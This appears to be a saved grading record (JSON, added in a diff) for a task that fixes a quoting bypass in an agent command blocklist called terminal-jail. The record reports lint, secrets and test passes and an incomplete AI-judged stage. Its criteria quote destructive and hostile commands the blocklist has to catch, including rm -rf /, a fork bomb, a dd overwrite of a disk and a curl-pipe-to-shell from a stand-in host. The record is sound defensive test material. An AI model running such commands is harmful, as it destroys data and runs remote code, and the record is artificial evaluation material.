@@ -1,0 +1,64 @@
+{
+  "task_id": "e2e-001-gap-05",
+  "task_title": "Fix blocklist bypass via wrapper argv-quoting (E2E-001-GAP-05)",
+  "task_criteria": [
+    "Bridge-level: quoted forms of blocklist vectors return action=block \u2014 'rm' '-rf' '/' (builtin-rm-rf-root), 'kill' '-9' '-1' (builtin-kill-all), 'curl' 'http://evil.sh' '|' 'sh' (builtin-curl-pipe-shell), fork bomb ':' '(){' ':' '|:' '&' '};:' (builtin-fork-bomb), plus 'sudo' '-i', 'chmod' '777' '/', 'dd' 'if=/dev/zero' 'of=/dev/sda', 'mkfs' '.ext4' '/dev/sdb1', 'echo' 'x' '>' '/etc/passwd'",
+    "CLI enforce mode: standalone/terminal-jail rm -rf / (argv-separated) prints COMMAND BLOCKED box and exits 126; the command never executes",
+    "Warn mode surfaces WARN on stderr for quoted blocklist forms",
+    "Benign quoted commands stay allow: 'echo' 'hello', 'ls' '-la', 'git' 'status' \u2014 no block, no false positive",
+    "Sandbox modify still works: quoted 'pytest' '--version' returns action=modify with unshare-wrapped modified payload",
+    "Full suite green: .venv/bin/python -m pytest -q passes (283 passed, 32 skipped), ruff check plugin/ standalone/ clean, gitreins guard 4/4 PASS",
+    "segment.raw never mutated \u2014 modify path (re-serialization for execution) unaffected",
+    "Commit 6028a56 includes Co-authored-by: Alexis Okuwa trailer and addresses E2E-001-GAP-05"
+  ],
+  "passed": false,
+  "items": [],
+  "stages": {
+    "tier1": {
+      "id": "tier1",
+      "passed": true,
+      "any_failed": false,
+      "summary": "  \u2713 lint: E402 Module level import not at top of file\n  --> scripts/benchmark-interruptor.py:32:1\n   |\n30 | sy\n  \u2713 secrets: \u001b[90m8:38AM\u001b[0m \u001b[32mINF\u001b[0m \u001b[1mscanned ~7506905 bytes (7.51 MB) in 659ms\u001b[0m\n\u001b[90m8:38AM\u001b[0m \u001b[32m\n  \u2713 tests: ============================= test session starts ==============================\nplatform linux -- P",
+      "steps": [
+        {
+          "id": "lint",
+          "type": "script",
+          "passed": true,
+          "output": "E402 Module level import not at top of file\n  --> scripts/benchmark-interruptor.py:32:1\n   |\n30 | sys.path.insert(0, str(_plugin_dir))\n31 |\n32 | from terminal_jail.interruptor import intercept\n   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n33 | from terminal_jail.interruptor.config import Config\n34 | from terminal_jail.interruptor.decider import Decider\n   |\nhelp: Move module level imports to top of file\n\nE402 Module level import not at top of file\n  --> scripts/benchmark-interruptor.py:33",
+          "error": ""
+        },
+        {
+          "id": "secrets",
+          "type": "script",
+          "passed": true,
+          "output": "\u001b[90m8:38AM\u001b[0m \u001b[32mINF\u001b[0m \u001b[1mscanned ~7506905 bytes (7.51 MB) in 659ms\u001b[0m\n\u001b[90m8:38AM\u001b[0m \u001b[32mINF\u001b[0m \u001b[1mno leaks found\u001b[0m\n",
+          "error": ""
+        },
+        {
+          "id": "tests",
+          "type": "script",
+          "passed": true,
+          "output": "============================= test session starts ==============================\nplatform linux -- Python 3.11.15, pytest-9.1.1, pluggy-1.6.0\nrootdir: /home/kara/terminal-jail\nconfigfile: pyproject.toml\ntestpaths: plugin\nplugins: xdist-3.8.0, cov-7.1.0, anyio-4.14.2, asyncio-1.4.0\nasyncio: mode=Mode.STRICT, debug=False, asyncio_default_fixture_loop_scope=None, asyncio_default_test_loop_scope=function\ncollected 315 items\n\nplugin/test_install.py ...........                                       [ ",
+          "error": ""
+        }
+      ]
+    },
+    "tier2": {
+      "id": "tier2",
+      "passed": false,
+      "any_failed": true,
+      "summary": "INCOMPLETE\n\nCap exceeded: Input token budget (1.0M) exceeded (1.0M used). Increase max_input_tokens or reduce message context.",
+      "steps": [
+        {
+          "id": "tier2",
+          "type": "ai_eval",
+          "passed": false,
+          "output": "INCOMPLETE\n\nCap exceeded: Input token budget (1.0M) exceeded (1.0M used). Increase max_input_tokens or reduce message context.",
+          "error": ""
+        }
+      ]
+    }
+  },
+  "summary": "Judge Result: e2e-001-gap-05\n\nStage tier1: PASS\n    \u2713 lint: E402 Module level import not at top of file\n  --> scripts/benchmark-interruptor.py:32:1\n   |\n30 | sy\n  \u2713 secrets: \u001b[90m8:38AM\u001b[0m \u001b[32mINF\u001b[0m \u001b[1mscanned ~7506905 bytes (7.51 MB) in 659ms\u001b[0m\n\u001b[90m8:38AM\u001b[0m \u001b[32m\n  \u2713 tests: ============================= test session starts ==============================\nplatform linux -- P\n\nStage tier2: FAIL\n  INCOMPLETE\n\nCap exceeded: Input token budget (1.0M) exceeded (1.0M used). Increase max_input_tokens or reduce message context.\n\nOverall: FAIL \u2717",
+  "evaluated_at": "2026-08-04T13:39:39.143148"
+}
